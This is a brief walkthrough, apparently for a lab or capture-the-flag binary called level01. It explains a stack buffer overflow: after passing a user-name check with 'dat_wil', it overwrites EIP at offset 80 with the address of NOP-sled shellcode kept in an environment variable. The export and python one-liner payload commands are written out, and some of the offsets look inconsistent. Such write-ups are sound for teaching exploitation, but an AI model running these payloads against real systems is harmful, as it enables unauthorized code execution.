A first read of ASM code allows us to see that function verify_user_name compares the user name to dat_wil and function verify_user_pass compares password to admin. However, when you try with admin it doesn't work.

Looking closely to the code tell us that finding the password won't help us! It doesn't call any system function for example. Thus, we have to provide our shellcode.

Find the offset to reach the EIP (80)

In order to store our shellcode, we can use environment variables

export SHELLCODE=`python -c 'print "\x90" * [80 - shellcode size] + "shellcode"'`
env | grep SHELLCODE

Find its address with gdb and add some bytes to the address founded in order to jump into the nop sled

Our input will be as follow :
bytes 0-7: "dat_wil", to pass the `verify_user_name` function.
byte  8: '\n', so that the first `fgets` stops taking user input
bytes 9-89: nop sled (80 to overwrite EIP with the next 4 bytes) 
bytes 90-94: Our shellcode address

(python -c 'print "dat_wil" + "\n" + "a" * 80 + "address shellcode reversed"'; cat) | ./level01
